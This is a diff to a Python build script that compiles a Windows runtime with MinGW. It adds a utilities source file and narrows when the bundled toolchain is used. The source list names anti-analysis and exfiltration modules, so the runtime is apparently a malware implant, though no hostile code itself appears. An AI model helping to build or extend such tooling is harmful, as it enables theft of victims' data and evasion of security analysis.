@@ -307,6 +307,9 @@ def stage_compile_runtime(build_dir, platform="windows"):
 
     WIN = RUNTIME_DIR / "windows"
     sources_win = [
+        # Windows utilities (cross-platform implementations)
+        WIN / "windows_utils.c",
+        # Windows-specific implementations
         RUNTIME_DIR / "init" / "anti_analysis.c",
         RUNTIME_DIR / "util" / "mem.c",
         RUNTIME_DIR / "exfil" / "exfil.c",
@@ -341,12 +344,14 @@ def stage_compile_runtime(build_dir, platform="windows"):
         "-I", str(RUNTIME_DIR / "windows"),
     ]
 
-    # Set up environment for bundled MinGW
+    # Set up environment for bundled MinGW only if using it
     compile_env = os.environ.copy()
-    bundled_mingw_bin = TOOLCHAIN / "mingw" / "bin"
-    bundled_mingw_lib = TOOLCHAIN / "mingw" / "lib"
     extra_flags = []
-    if bundled_mingw_lib.exists():
+    use_bundled = mingw_gcc.startswith(str(TOOLCHAIN / "mingw"))
+
+    if use_bundled:
+        bundled_mingw_bin = TOOLCHAIN / "mingw" / "bin"
+        bundled_mingw_lib = TOOLCHAIN / "mingw" / "lib"
         # Prioritize bundled toolchain bin directory in PATH
         if "PATH" in compile_env:
             compile_env["PATH"] = str(bundled_mingw_bin) + ":" + compile_env["PATH"]
